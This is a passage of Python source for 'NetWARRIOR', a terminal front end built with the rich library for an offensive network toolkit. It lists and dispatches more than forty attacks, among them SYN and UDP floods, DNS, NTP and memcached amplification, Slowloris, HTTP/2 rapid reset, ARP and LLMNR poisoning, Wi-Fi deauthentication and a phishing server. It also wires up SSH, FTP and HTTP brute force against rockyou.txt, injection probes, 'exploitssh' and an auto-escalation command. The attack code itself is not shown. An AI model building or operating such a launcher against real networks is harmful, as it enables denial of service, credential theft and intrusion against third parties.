        # Dedicated console so we never fight with the global one inside Live
        self._con = Console(force_terminal=True, highlight=False)

    # ── Box style selection ───────────────────────────────────────────────────
    @staticmethod
    def _panel_box() -> box.Box:
        """
        ROUNDED on any modern terminal (Linux, macOS, Windows Terminal,
        VS Code, ConEmu). Fall back to ASCII on legacy Windows CMD where
        box-drawing corners render as black squares.
        """
        if sys.platform == "win32":
            wt  = os.environ.get("WT_SESSION")          # Windows Terminal
            cme = os.environ.get("ConEmuPID")           # ConEmu
            tp  = os.environ.get("TERM_PROGRAM")        # VS Code etc.
            if not (wt or cme or tp):
                return box.ASCII
        return box.ROUNDED

    # ── Terminal size ─────────────────────────────────────────────────────────
    @staticmethod
    def _term_size() -> tuple:
        try:
            t = os.get_terminal_size()
            return t.columns, t.lines
        except OSError:
            return 80, 24

    # ── Colour helper ─────────────────────────────────────────────────────────
    def _c(self, key: str) -> str:
        return self._C.get(key, "white")

    # ── Async run loop ────────────────────────────────────────────────────────
    async def run(self):
        self._stdin_reader = asyncio.create_task(self._stdin_reader_thread())
        pb = self._panel_box()
        with Live(
            self._render(),
            refresh_per_second=4,
            screen=True,
            console=self._con,
        ) as live:
            while self.running:
                live.update(self._render())
                while not self._command_queue.empty():
                    cmd = await self._command_queue.get()
                    await self._process_command(cmd)
                await asyncio.sleep(0.1)
        if self._stdin_reader:
            self._stdin_reader.cancel()
        self.engine.stop()

    async def _stdin_reader_thread(self):
        loop = asyncio.get_running_loop()
        while self.running:
            try:
                line = await loop.run_in_executor(None, sys.stdin.readline)
                if not line:
                    await asyncio.sleep(0.1)
                    continue
                line = line.strip()
                if line:
                    await self._command_queue.put(line)
            except Exception as e:
                self.log.add(f"Stdin error: {e}", level="error")
                await asyncio.sleep(0.1)

    # ── Master render ─────────────────────────────────────────────────────────
    def _render(self) -> Layout:
        cols, rows = self._term_size()
        wide = cols >= 100

        # Adaptive panel heights based on available rows
        log_h = max(5,  min(10, rows // 5))
        out_h = max(4,  min(7,  rows // 6))

        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="nav",    size=3),
            Layout(name="body",   ratio=1),
            Layout(name="logs",   size=log_h),
            Layout(name="output", size=out_h),
        )

        layout["header"].update(self._render_header(cols))
        layout["nav"].update(self._render_nav())

        if wide:
            body = Layout()
            body.split_row(
                Layout(name="content", ratio=7),
                Layout(name="sidebar", ratio=3),
            )
            body["content"].update(self._render_content(cols))
            body["sidebar"].update(self._render_sidebar())
            layout["body"].update(body)
        else:
            layout["body"].update(self._render_content(cols))

        layout["logs"].update(self._render_logs(cols))
        layout["output"].update(self._render_output(cols))

        return layout

    # ── Header bar ────────────────────────────────────────────────────────────
    def _render_header(self, cols: int) -> Panel:
        pb = self._panel_box()
        mode_label, mode_ck = self._MODES.get(self.mode, ("???", "dim"))
        mode_col = self._c(mode_ck)

        logo = Text()
        logo.append("  NETWARRIOR", style=self._c("header_logo"))
        logo.append("  ASYNC", style=self._c("header_sub"))

        mode_text = Text(justify="center")
        mode_text.append("MODE: ", style=self._c("header_sub"))
        mode_text.append(mode_label, style=f"bold {mode_col}")

        ts = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
        clock = Text(f"{ts}  ", style=self._c("header_time"), justify="right")

        grid = Table.grid(expand=True)
        grid.add_column(justify="left",   ratio=1)
        grid.add_column(justify="center", ratio=1)
        grid.add_column(justify="right",  ratio=1)
        grid.add_row(logo, mode_text, clock)

        return Panel(grid, border_style=self._c("border"), box=pb, padding=(0, 1))

    # ── Navigation bar ────────────────────────────────────────────────────────
    def _render_nav(self) -> Panel:
        pb = self._panel_box()
        active_map = {
            "attack":  "1",
            "recon":   "2",
            "pentest": "3",
            "report":  "4",
            "command": "5",
        }
        active_key = active_map.get(self.mode, "")

        nav = Text(justify="center")
        for i, (key, label, ck, _) in enumerate(self._NAV):
            if i:
                nav.append("    ", style="")
            col = self._c(ck)
            is_active = key == active_key
            bracket_style = f"bold {col}" if is_active else self._c("separator")
            label_style   = f"bold {col}" if is_active else self._c("nav_inactive")

            nav.append("[", style=bracket_style)
            nav.append(key, style=f"bold {col}")
            nav.append("]", style=bracket_style)
            nav.append(f" {label}", style=label_style)

        return Panel(
            Text.from_markup(f"[grey35]{'─' * 10}[/]"),  # invisible line for padding
            renderable=None,
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 0),
        ) if False else Panel(  # always use second branch
            nav,
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Content router ────────────────────────────────────────────────────────
    def _render_content(self, cols: int) -> Panel:
        if self.mode == "menu":
            return self._render_menu(cols)
        if self.mode == "attack":
            return self._render_attack_menu(cols)
        if self.mode == "recon":
            return self._render_recon_menu()
        if self.mode == "pentest":
            return self._render_pentest_menu()
        if self.mode == "report":
            return self._render_report()
        if self.mode == "command":
            return self._render_command_help()
        return Panel("Unknown mode", border_style="red", box=self._panel_box())

    # ── Stats sidebar (wide terminals only) ───────────────────────────────────
    def _render_sidebar(self) -> Panel:
        pb   = self._panel_box()
        pkts = self.registry.total_packets()
        act  = self.registry.active()

        stats = Table.grid(expand=True, padding=(0, 2))
        stats.add_column(style=self._c("stat_label"), no_wrap=True)
        stats.add_column(style=self._c("stat_value"), no_wrap=True)
        stats.add_row("Packets",   f"{pkts:,}")
        stats.add_row("Active",    str(len(act)))
        stats.add_row("IP",        self.net.ip or "N/A")
        stats.add_row("Interface", self.net.interface or "N/A")
        stats.add_row("Gateway",   self.net.gateway or "N/A")

        running = Text()
        if act:
            running.append("\n  Running:\n", style=self._c("separator"))
            for name in act[:10]:
                running.append("  + ", style=self._c("active_dot"))
                running.append(name[:22] + "\n", style=self._c("stat_value"))
        else:
            running.append("\n  No active attacks\n", style=self._c("dim"))

        return Panel(
            Group(stats, running),
            title=f"[{self._c('border')}]STATUS[/]",
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Main menu ─────────────────────────────────────────────────────────────
    def _render_menu(self, cols: int) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 2))
        t.add_column("KEY",         style=self._c("key"),     width=5)
        t.add_column("MODE",        style=self._c("heading"), ratio=1)
        t.add_column("DESCRIPTION", style=self._c("desc"),    ratio=4)

        entries = [
            ("1", "ATTACKS",  "attack",  "SYN / UDP / ICMP / AMP / App-layer / WiFi / L2 — 40+ vectors"),
            ("2", "RECON",    "recon",   "Port scan, OS fingerprint, DNS tools, vulnerability intel"),
            ("3", "PENTEST",  "pentest", "SSH / FTP brute force, SQLi, XSS, LFI, SSRF, command injection"),
            ("4", "REPORT",   "report",  "Live session report — packets sent, errors, active attacks"),
            ("5", "CMD",      "command", "Direct command shell — type any command with full autocomplete"),
            ("S", "STOP ALL", "attack",  "Terminate every running attack immediately"),
            ("Q", "QUIT",     "dim",     "Exit NetWARRIOR cleanly"),
        ]
        for key, label, ck, desc in entries:
            col = self._c(ck)
            t.add_row(
                Text(key,   style=f"bold {col}"),
                Text(label, style=f"bold {col}"),
                Text(desc,  style=self._c("desc")),
            )

        hint = Text(
            "\n  Type a number to navigate, or enter commands directly in any mode.\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, hint),
            title=f"[bold {self._c('menu')}]NETWARRIOR  —  MAIN MENU[/]",
            border_style=self._c("menu"),
            box=pb,
            padding=(0, 1),
        )

    # ── Attack menu ───────────────────────────────────────────────────────────
    def _render_attack_menu(self, cols: int) -> Panel:
        pb = self._panel_box()

        # (category, command, description)
        attacks = [
            ("FLOOD",  "syn",        "SYN flood"),
            ("FLOOD",  "udp",        "UDP flood"),
            ("FLOOD",  "icmp",       "ICMP flood"),
            ("FLOOD",  "ack",        "TCP ACK flood"),
            ("FLOOD",  "rst",        "TCP RST flood"),
            ("FLOOD",  "xmas",       "TCP XMAS flood"),
            ("FLOOD",  "null",       "TCP NULL flood"),
            ("FLOOD",  "fin",        "TCP FIN flood"),
            ("FLOOD",  "zero",       "TCP Zero-Window"),
            ("FLOOD",  "mac",        "MAC flood"),
            ("FLOOD",  "smurf",      "Smurf attack"),
            ("FLOOD",  "land",       "LAND attack"),
            ("FLOOD",  "sctp",       "SCTP INIT flood"),
            ("FLOOD",  "teardrop",   "Teardrop"),
            ("FLOOD",  "pod",        "Ping of Death"),
            ("AMP",    "dnsamp",     "DNS amplification"),
            ("AMP",    "ntpamp",     "NTP amplification"),
            ("AMP",    "snmpamp",    "SNMP amplification"),
            ("AMP",    "memcached",  "Memcached amplification"),
            ("AMP",    "ssdpamp",    "SSDP amplification"),
            ("AMP",    "chargen",    "Chargen amplification"),
            ("APP",    "slowloris",  "Slowloris"),
            ("APP",    "http",       "HTTP flood"),
            ("APP",    "rudy",       "RUDY"),
            ("APP",    "slowread",   "Slow Read"),
            ("APP",    "http2reset", "HTTP/2 rapid reset"),
            ("APP",    "ws",         "WebSocket flood"),
            ("L2",     "arp",        "ARP poison"),
            ("L2",     "vlan",       "VLAN double-tag"),
            ("L2",     "l2cdp",      "CDP flood"),
            ("L2",     "l2lldp",     "LLDP flood"),
            ("L2",     "l2stp",      "STP flood"),
            ("IPV6",   "ipv6ra",     "IPv6 RA flood"),
            ("IPV6",   "ipv6na",     "IPv6 NA flood"),
            ("IPV6",   "ipv6ns",     "IPv6 NS flood"),
            ("WIFI",   "deauth",     "Deauth attack"),
            ("WIFI",   "beacon",     "Beacon flood"),
            ("MISC",   "gre",        "GRE IP spoof"),
            ("MISC",   "pcap",       "PCAP replay"),
            ("MISC",   "llmnr",      "LLMNR poison"),
            ("MISC",   "nbns",       "NBNS poison"),
            ("MISC",   "mdns",       "mDNS poison"),
            ("MISC",   "dhcp",       "DHCP starvation"),
            ("MISC",   "phish",      "Phishing server"),
            ("MISC",   "cloud",      "Cloud recon"),
            ("MISC",   "passive",    "Passive capture"),
            ("MISC",   "traffic",    "Traffic monitor"),
            ("MISC",   "bandwidth",  "Bandwidth meter"),
            ("MISC",   "conns",      "Connection table"),
        ]

        cat_col = {
            "FLOOD": "bright_red",
            "AMP":   "red",
            "APP":   "bright_yellow",
            "L2":    "bright_magenta",
            "IPV6":  "bright_blue",
            "WIFI":  "bright_cyan",
            "MISC":  "grey62",
        }

        if cols >= 120:
            # Two-column layout for wide terminals
            t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
            for _ in range(2):
                t.add_column("CAT",  style=self._c("category"), width=6, no_wrap=True)
                t.add_column("CMD",  style=self._c("key"),       width=12, no_wrap=True)
                t.add_column("DESC", style=self._c("desc"),      ratio=1)

            half = (len(attacks) + 1) // 2
            left, right = attacks[:half], attacks[half:]
            for i, (lc, lk, ld) in enumerate(left):
                lcat = Text(lc, style=cat_col.get(lc, "white"))
                lkey = Text(lk, style=f"bold {cat_col.get(lc, 'white')}")
                ldesc= Text(ld)
                if i < len(right):
                    rc, rk, rd = right[i]
                    rcat = Text(rc, style=cat_col.get(rc, "white"))
                    rkey = Text(rk, style=f"bold {cat_col.get(rc, 'white')}")
                    rdesc= Text(rd)
                    t.add_row(lcat, lkey, ldesc, rcat, rkey, rdesc)
                else:
                    t.add_row(lcat, lkey, ldesc, Text(""), Text(""), Text(""))
        else:
            t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
            t.add_column("CAT",  style=self._c("category"), width=6, no_wrap=True)
            t.add_column("CMD",  style=self._c("key"),       width=12, no_wrap=True)
            t.add_column("DESC", style=self._c("desc"),      ratio=1)
            for cat, key, desc in attacks:
                col = cat_col.get(cat, "white")
                t.add_row(
                    Text(cat, style=col),
                    Text(key, style=f"bold {col}"),
                    Text(desc),
                )

        hint = Text(
            "\n  Usage:   attack <cmd> <target> [port] [duration] [pps]\n"
            "  Example: attack syn 192.168.1.1 80 30 1000\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, hint),
            title=f"[bold {self._c('attack')}]ATTACK MENU[/]",
            border_style=self._c("attack"),
            box=pb,
            padding=(0, 1),
        )

    # ── Recon menu ────────────────────────────────────────────────────────────
    def _render_recon_menu(self) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("COMMAND",             style=self._c("key"),     ratio=2)
        t.add_column("DESCRIPTION",         style=self._c("desc"),    ratio=2)
        t.add_column("EXAMPLE",             style=self._c("example"), ratio=3)

        rows = [
            ("scan <ip>",                   "TCP port scan (top 15 ports)",    "scan 192.168.1.1"),
            ("scan <subnet>",               "Network host discovery",           "scan 192.168.1.0/24"),
            ("fingerprint <ip>",            "OS detection + banner grab",       "fingerprint 10.0.0.1"),
            ("map <subnet>",                "ARP/ICMP topology map",            "map 192.168.1.0/24"),
            ("dns <domain>",                "DNS A/AAAA lookup",                "dns example.com"),
            ("dnsrev <ip>",                 "Reverse DNS PTR lookup",           "dnsrev 8.8.8.8"),
            ("zone <domain> <server>",      "DNS zone transfer attempt",        "zone example.com ns1.example.com"),
            ("vuln <ip>",                   "Banner-based vuln detection",      "vuln 192.168.1.1"),
        ]
        for cmd, desc, ex in rows:
            t.add_row(cmd, desc, ex)

        return Panel(
            t,
            title=f"[bold {self._c('recon')}]RECON MENU[/]",
            border_style=self._c("recon"),
            box=pb,
            padding=(0, 1),
        )

    # ── Pentest menu ──────────────────────────────────────────────────────────
    def _render_pentest_menu(self) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("COMMAND",                              style=self._c("key"),     ratio=3)
        t.add_column("DESCRIPTION",                          style=self._c("desc"),    ratio=2)
        t.add_column("EXAMPLE",                              style=self._c("example"), ratio=4)

        rows = [
            ("sshbrute <host> <user> <wordlist>",            "SSH brute force",        "sshbrute 10.0.0.1 root /usr/share/wordlists/rockyou.txt"),
            ("ftpbrute <host> <user> <wordlist>",            "FTP brute force",        "ftpbrute 10.0.0.1 anonymous /tmp/pass.txt"),
            ("httpbasic <url> <userlist> <passlist>",         "HTTP Basic auth brute",  "httpbasic http://10.0.0.1 users.txt pass.txt"),
            ("sql <url> <param>",                            "SQL injection probe",    "sql http://10.0.0.1/page id"),
            ("xss <url> <param>",                            "XSS probe",              "xss http://10.0.0.1/search q"),
            ("lfi <url> <param>",                            "LFI path traversal",     "lfi http://10.0.0.1/view file"),
            ("ssrf <url> <param>",                           "SSRF probe",             "ssrf http://10.0.0.1/fetch url"),
            ("cmdinj <url> <param>",                         "Command injection probe","cmdinj http://10.0.0.1/run cmd"),
        ]
        for cmd, desc, ex in rows:
            t.add_row(cmd, desc, ex)

        return Panel(
            t,
            title=f"[bold {self._c('pentest')}]PENTEST MENU[/]",
            border_style=self._c("pentest"),
            box=pb,
            padding=(0, 1),
        )

    # ── Report view ───────────────────────────────────────────────────────────
    def _render_report(self) -> Panel:
        pb      = self._panel_box()
        pkts    = self.registry.total_packets()
        active  = self.registry.active()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("ATTACK",  style=self._c("key"),   ratio=3)
        t.add_column("PACKETS", style=self._c("desc"),  justify="right", width=12)
        t.add_column("ERRORS",  style="bright_yellow",  justify="right", width=8)
        t.add_column("STATUS",  style=self._c("desc"),  width=10)

        for name, att in self.registry._attacks.items():
            status = (
                Text("RUNNING", style=f"bold {self._c('active_dot')}")
                if att.running
                else Text("DONE", style=self._c("dim"))
            )
            t.add_row(name, f"{att.packets_sent:,}", str(att.errors), status)

        if not self.registry._attacks:
            t.add_row("[dim]No attacks recorded yet[/]", "", "", "")

        summary = Text(
            f"\n  Total packets: {pkts:,}   Active attacks: {len(active)}\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, summary),
            title=f"[bold {self._c('report')}]SESSION REPORT[/]",
            border_style=self._c("report"),
            box=pb,
            padding=(0, 1),
        )

    # ── Command reference view ────────────────────────────────────────────────
    def _render_command_help(self) -> Panel:
        pb = self._panel_box()

        t = Table(box=box.SIMPLE, expand=True, padding=(0, 1))
        t.add_column("COMMAND",     style=self._c("key"),  ratio=2)
        t.add_column("DESCRIPTION", style=self._c("desc"), ratio=3)

        cmds = [
            ("help",                               "Show this command reference"),
            ("1 / 2 / 3 / 4 / 5",                 "Switch view: Attacks / Recon / Pentest / Report / CMD"),
            ("menu",                               "Return to main menu"),
            ("scan <ip>",                          "Port scan a single host"),
            ("scan <subnet>",                      "Network discovery (CIDR notation)"),
            ("fingerprint <ip>",                   "OS detection and service banners"),
            ("map <subnet>",                       "ARP + ICMP topology map"),
            ("dns <domain>",                       "DNS lookup"),
            ("dnsrev <ip>",                        "Reverse DNS lookup"),
            ("vuln <ip>",                          "Vulnerability check against banners"),
            ("sshbrute / ftpbrute / httpbasic",    "Credential brute force attacks"),
            ("sql / xss / lfi / ssrf / cmdinj",    "Web application vulnerability probes"),
            ("attack <type> <target> [args]",      "Launch an attack (see ATTACK menu for types)"),
            ("list",                               "List all active attacks by name"),
            ("stop  /  s",                         "Stop all running attacks"),
            ("status",                             "Print packet count and active attack count"),
            ("report",                             "Switch to report view"),
            ("conns",                              "Show live connection table"),
            ("q  /  quit",                         "Exit NetWARRIOR cleanly"),
        ]
        for cmd, desc in cmds:
            t.add_row(cmd, desc)

        hint = Text(
            "\n  Type commands here. Press Enter to execute.\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, hint),
            title=f"[bold {self._c('command')}]COMMAND REFERENCE[/]",
            border_style=self._c("command"),
            box=pb,
            padding=(0, 1),
        )

    # ── Log panel ─────────────────────────────────────────────────────────────
    def _render_logs(self, cols: int) -> Panel:
        pb = self._panel_box()

        level_map = {
            "ok":    ("OK  ", self._c("log_ok")),
            "error": ("ERR ", self._c("log_err")),
            "warn":  ("WARN", self._c("log_warn")),
            "info":  ("INFO", self._c("log_info")),
        }

        lines = Text()
        for entry in self.log.get(12):
            level  = entry.get("level", "info")
            label, lstyle = level_map.get(level, ("INFO", self._c("log_info")))
            tag    = entry.get("tag", "")
            msg    = entry.get("msg", "")

            # Truncate message to fit terminal width
            tag_w  = 10
            meta_w = 2 + 8 + 2 + 4 + 2 + tag_w + 2   # indent+time+gap+level+gap+tag+gap
            max_msg= max(20, cols - meta_w)
            if len(msg) > max_msg:
                msg = msg[:max_msg - 1] + "…"

            lines.append(f"  {entry['time']}  ", style=self._c("log_time"))
            lines.append(f"{label}  ",            style=f"bold {lstyle}")
            if tag:
                lines.append(f"{tag:<10}", style=self._c("log_tag"))
                lines.append("  ")
            lines.append(msg + "\n", style=self._c("log_msg"))

        if not lines._spans:
            lines.append("  No log entries yet.", style=self._c("dim"))

        return Panel(
            lines,
            title=f"[{self._c('border')}]LOGS[/]",
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Output panel ──────────────────────────────────────────────────────────
    def _render_output(self, cols: int) -> Panel:
        pb = self._panel_box()

        if self.cmd_output:
            body = Text(self.cmd_output, style=self._c("output"))
        else:
            body = Text(
                "  No output yet.",
                style=self._c("output_dim"),
            )

        prompt = Text()
        prompt.append("\n  >> ", style=self._c("prompt"))
        prompt.append("Type a command and press Enter", style=self._c("dim"))

        return Panel(
            Group(body, prompt),
            title=f"[{self._c('border')}]OUTPUT[/]",
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Command processor (unchanged from final version) ──────────────────────
    async def _process_command(self, cmd):
        parts = cmd.strip().split()
        if not parts:
            return
        command = parts[0].lower()
        args = parts[1:]

        if command in ("q", "quit"):
            self.running = False
            self.engine.stop()
            return
        elif command == "1":
            self.mode = "attack"
            self.cmd_output = "Switched to Attack Menu"
            return
        elif command == "2":
            self.mode = "recon"
            self.cmd_output = "Switched to Recon Menu"
            return
        elif command == "3":
            self.mode = "pentest"
            self.cmd_output = "Switched to Pentest Menu"
            return
        elif command == "4":
            self.mode = "report"
            self.cmd_output = "Switched to Report"
            return
        elif command == "5":
            self.mode = "command"
            self.cmd_output = "Command mode active. Type commands directly."
            return
        elif command in ("s", "stop"):
            self.engine.stop()
            self.cmd_output = "All attacks stopped."
            return

        def table_to_str(table):
            cap = StringIO()
            cap_con = Console(file=cap, highlight=False)
            cap_con.print(table)
            return cap.getvalue()

        output = ""
        try:
            if command == "help":
                self.mode = "command"
                output = "Command reference displayed above."
            elif command == "scan":
                if len(args) < 1:
                    output = "[red]Usage: scan <ip> or <subnet>[/]"
                else:
                    target = args[0]
                    if "/" in target:
                        devices = await self.recon.network_map(target)
                        table = Table(title=f"Devices in {target}")
                        table.add_column("IP")
                        table.add_column("MAC")
                        table.add_column("Hostname")
                        for ip, d in devices.items():
                            table.add_row(ip, d.get("mac", "N/A"), d.get("hostname", "N/A"))
                        output = table_to_str(table)
                    else:
                        ports = await self.recon.port_scan(
                            target,
                            [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 5900, 6379, 8080, 8443]
                        )
                        output = f"[green]Open ports on {target}: {ports}[/]"
            elif command == "fingerprint":
                if len(args) < 1:
                    output = "[red]Usage: fingerprint <ip>[/]"
                else:
                    fp = await self.recon.fingerprint(args[0])
                    table = Table(title=f"Fingerprint {args[0]}")
                    table.add_column("Property")
                    table.add_column("Value")
                    table.add_row("OS",         fp.get("os", "Unknown"))
                    table.add_row("TTL",        str(fp.get("ttl", "N/A")))
                    table.add_row("Open Ports", ", ".join(map(str, fp.get("ports", []))))
                    output = table_to_str(table)
            elif command == "map":
                subnet = args[0] if args else "192.168.1.0/24"
                devices = await self.recon.network_map(subnet)
                output = f"[green]Found {len(devices)} devices[/]"
            elif command == "dns":
                if len(args) < 1:
                    output = "[red]Usage: dns <domain>[/]"
                else:
                    ans = self.recon.dns_lookup(args[0])
                    output = str(ans)
            elif command == "dnsrev":
                if len(args) < 1:
                    output = "[red]Usage: dnsrev <ip>[/]"
                else:
                    ans = self.recon.dns_reverse(args[0])
                    output = str(ans)
            elif command == "zone":
                if len(args) < 2:
                    output = "[red]Usage: zone <domain> <server>[/]"
                else:
                    ans = self.recon.zone_transfer(args[0], args[1])
                    output = str(ans)
            elif command == "vuln":
                if len(args) < 1:
                    output = "[red]Usage: vuln <ip>[/]"
                else:
                    results = await self.recon.vuln_scan(args[0])
                    if results:
                        table = Table(title=f"Vulnerabilities on {args[0]}")
                        table.add_column("Port")
                        table.add_column("Vulnerability")
                        table.add_column("Severity")
                        for v in results:
                            table.add_row(str(v["port"]), v["vulnerability"], v["severity"])
                        output = table_to_str(table)
                    else:
                        output = "[green]No common vulnerabilities found[/]"
            elif command == "sshbrute":
                if len(args) < 3:
                    output = "[red]Usage: sshbrute <host> <user> <wordlist>[/]"
                else:
                    found = await self.pentest.ssh_brute(args[0], args[1], args[2])
                    output = (
                        f"[red]Password found: {found}[/]"
                        if found
                        else "[yellow]No password found[/]"
                    )
            elif command == "ftpbrute":
                if len(args) < 3:
                    output = "[red]Usage: ftpbrute <host> <user> <wordlist>[/]"
                else:
                    att = await self.attacks.ftp_brute(args[0], args[1], args[2])
                    output = (
                        f"[red]Password found: {att.findings[0]['password']}[/]"
                        if att.findings
                        else "[yellow]No password found[/]"
                    )
            elif command == "httpbasic":
                if len(args) < 3:
                    output = "[red]Usage: httpbasic <url> <userwordlist> <passwordlist>[/]"
                else:
                    att = await self.attacks.http_basic_brute(args[0], args[1], args[2])
                    if att.findings:
                        creds = att.findings[0]["credentials"]
                        output = f"[red]Credentials found: {creds[0]}:{creds[1]}[/]"
                    else:
                        output = "[yellow]No credentials found[/]"
            elif command == "conns":
                att = await self.attacks.connection_table()
                output = (
                    att.findings[0]["table"]
                    if att.findings
                    else "[yellow]No connections found[/]"
                )
            elif command == "sql":
                if len(args) < 2:
                    output = "[red]Usage: sql <url> <param>[/]"
                else:
                    results = await self.pentest.web_sql_injection(args[0], [args[1]])
                    output = str(results)
            elif command == "xss":
                if len(args) < 2:
                    output = "[red]Usage: xss <url> <param>[/]"
                else:
                    results = await self.pentest.web_xss_scan(args[0], [args[1]])
                    output = str(results)
            elif command == "lfi":
                if len(args) < 2:
                    output = "[red]Usage: lfi <url> <param>[/]"
                else:
                    results = await self.pentest.web_lfi_scan(args[0], [args[1]])
                    output = str(results)
            elif command == "ssrf":
                if len(args) < 2:
                    output = "[red]Usage: ssrf <url> <param>[/]"
                else:
                    att = await self.attacks.ssrf_scan(args[0], [args[1]])
                    output = (
                        f"SSRF findings: {att.findings[0]['vulnerabilities']}"
                        if att.findings
                        else "[green]No SSRF vulnerabilities found[/]"
                    )
            elif command == "cmdinj":
                if len(args) < 2:
                    output = "[red]Usage: cmdinj <url> <param>[/]"
                else:
                    att = await self.attacks.cmd_injection_scan(args[0], [args[1]])
                    output = (
                        f"Command injection: {att.findings[0]['vulnerabilities']}"
                        if att.findings
                        else "[green]No command injection found[/]"
                    )
            elif command == "attack":
                if len(args) < 2:
                    output = "[red]Usage: attack <type> <target> [port] [duration] [pps][/]"
                else:
                    atype    = args[0]
                    target   = args[1]
                    port     = int(args[2]) if len(args) > 2 else 80
                    duration = int(args[3]) if len(args) > 3 else 30
                    pps      = int(args[4]) if len(args) > 4 else 1000
                    method_map = {
                        "syn":        self.attacks.syn_flood,
                        "udp":        self.attacks.udp_flood,
                        "icmp":       self.attacks.icmp_flood,
                        "ack":        self.attacks.tcp_ack_flood,
                        "rst":        self.attacks.tcp_rst_flood,
                        "xmas":       self.attacks.tcp_xmas_flood,
                        "null":       self.attacks.tcp_null_flood,
                        "fin":        self.attacks.tcp_fin_flood,
                        "zero":       self.attacks.tcp_zero_window,
                        "mac":        self.attacks.mac_flood,
                        "smurf":      self.attacks.smurf,
                        "land":       self.attacks.land,
                        "sctp":       self.attacks.sctp_init_flood,
                        "teardrop":   self.attacks.teardrop,
                        "pod":        self.attacks.ping_of_death,
                        "dnsamp":     self.attacks.dns_amp,
                        "ntpamp":     self.attacks.ntp_amp,
                        "snmpamp":    self.attacks.snmp_amp,
                        "memcached":  self.attacks.memcached_amp,
                        "ssdpamp":    self.attacks.ssdp_amp,
                        "chargen":    self.attacks.chargen_amp,
                        "slowloris":  self.attacks.slowloris,
                        "http":       self.attacks.http_flood,
                        "rudy":       self.attacks.rudy_attack,
                        "slowread":   self.attacks.slow_read,
                        "http2reset": self.attacks.http2_rapid_reset,
                        "ws":         self.attacks.websocket_flood,
                        "arp":        self.attacks.arp_poison,
                        "vlan":       self.attacks.vlan_double_tag,
                        "gre":        self.attacks.gre_ip_spoof,
                        "pcap":       self.attacks.replay_pcap,
                        "deauth":     self.attacks.deauth,
                        "beacon":     self.attacks.beacon_flood,
                        "ipv6ra":     self.attacks.ipv6_ra_flood,
                        "ipv6na":     self.attacks.ipv6_na_flood,
                        "ipv6ns":     self.attacks.ipv6_ns_flood,
                        "l2cdp":      self.attacks.l2_protocol_flood,
                        "l2lldp":     self.attacks.l2_protocol_flood,
                        "l2stp":      self.attacks.l2_protocol_flood,
                        "llmnr":      self.attacks.llmnr_poison,
                        "nbns":       self.attacks.nbns_poison,
                        "mdns":       self.attacks.mdns_poison,
                        "dhcp":       self.attacks.dhcp_starvation,
                        "phish":      self.attacks.start_phishing_server,
                        "cloud":      self.attacks.cloud_recon,
                        "sshtun":     self.attacks.ssh_tunnel,
                        "passive":    self.attacks.passive_capture,
                        "perf":       self.attacks.network_perf,
                        "ssdpdiscovery": self.attacks.ssdp_discovery,
                        "radiuspod":  self.attacks.radius_pod,
                        "nmap":       self.attacks.nmap_wrapper,
                        "sqlmap":     self.attacks.sqlmap_wrapper,
                        "ftpbrute":   self.attacks.ftp_brute,
                        "httpbasic":  self.attacks.http_basic_brute,
                        "ssrf":       self.attacks.ssrf_scan,
                        "cmdinj":     self.attacks.cmd_injection_scan,
                        "exploitssh": self.attacks.exploit_ssh,
                        "wirehand":   self.attacks.wireless_handshake_capture,
                        "autoesc":    self.attacks.auto_escalate,
                        "traffic":    self.attacks.traffic_monitor,
                        "bandwidth":  self.attacks.bandwidth_meter,
                        "conns":      self.attacks.connection_table,
                        "chaos":      self.attacks.chaos_mode,
                    }
                    if atype not in method_map:
                        output = f"[red]Unknown attack type: {atype}[/]"
                    else:
                        method = method_map[atype]
                        try:
                            no_port_types = {
                                "icmp", "teardrop", "pod",
                                "dnsamp", "ntpamp", "snmpamp", "memcached", "ssdpamp", "chargen",
                                "ssdpdiscovery", "radiuspod", "pcap", "deauth", "beacon",
                                "ipv6ra", "ipv6na", "ipv6ns",
                                "l2cdp", "l2lldp", "l2stp",
                                "gre", "llmnr", "nbns", "mdns", "dhcp",
                                "cloud", "passive", "perf",
                                "nmap", "sqlmap", "ftpbrute", "httpbasic",
                                "ssrf", "cmdinj", "exploitssh", "wirehand",
                                "autoesc", "traffic", "bandwidth", "conns", "chaos",
                            }
                            if atype in ("l2cdp", "l2lldp", "l2stp"):
                                await method(proto_type=atype[2:], duration=duration, pps=pps)
                            elif atype == "pcap":
                                await method(target, duration=duration, pps=pps)
                            elif atype == "deauth":
                                await method(target, duration=duration)
                            elif atype == "beacon":
                                await method(duration=duration)
                            elif atype in ("llmnr", "nbns", "mdns"):
                                await method(target, duration=duration)
                            elif atype == "dhcp":
                                await method(target, duration=duration)
                            elif atype == "cloud":
                                await method(target_ips=[target], duration=duration)
                            elif atype == "passive":
                                await method(duration=duration)
                            elif atype == "perf":
                                await method(target, duration=duration)
                            elif atype in ("ssdpdiscovery", "radiuspod"):
                                await method(duration=duration)
                            elif atype == "nmap":
                                await method(target, duration=duration)
                            elif atype == "sqlmap":
                                await method(target, duration=duration)
                            elif atype == "ftpbrute":
                                await method(target, "anonymous", "/usr/share/wordlists/rockyou.txt")
                            elif atype == "httpbasic":
                                await method(target, "/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt")
                            elif atype == "ssrf":
                                await method(target, ["url"])
                            elif atype == "cmdinj":
                                await method(target, ["cmd"])
                            elif atype == "exploitssh":
                                await method(target, username="root")
